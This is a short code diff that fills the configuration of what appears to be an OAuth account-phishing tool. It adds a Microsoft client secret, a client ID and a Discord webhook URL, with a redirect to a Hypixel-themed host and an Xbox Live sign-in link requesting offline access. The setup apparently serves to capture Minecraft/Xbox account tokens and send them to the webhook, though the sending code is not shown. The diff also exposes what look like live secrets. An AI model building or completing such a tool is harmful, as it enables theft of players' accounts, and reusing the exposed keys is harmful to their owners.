@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = ''
+const client_secret = 'sSw8Q~1elM1O1CEea1GHZgFoGdlaD6MWPrL3yb~k' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '5724e99b-0daf-47f1-a3c1-e95ecb570385'
 const redirect_uri = 'https://hypixel.onrender.com'
-const webhook_url = ''
+const webhook_url = 'https://discord.com/api/webhooks/1049450771051196446/-biSdQNnMwTE0XdF3KLcEJPb8_drhkpkS_xFIaLOvVChoHE-Cyid4sm3xyHbdABHMz4p'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
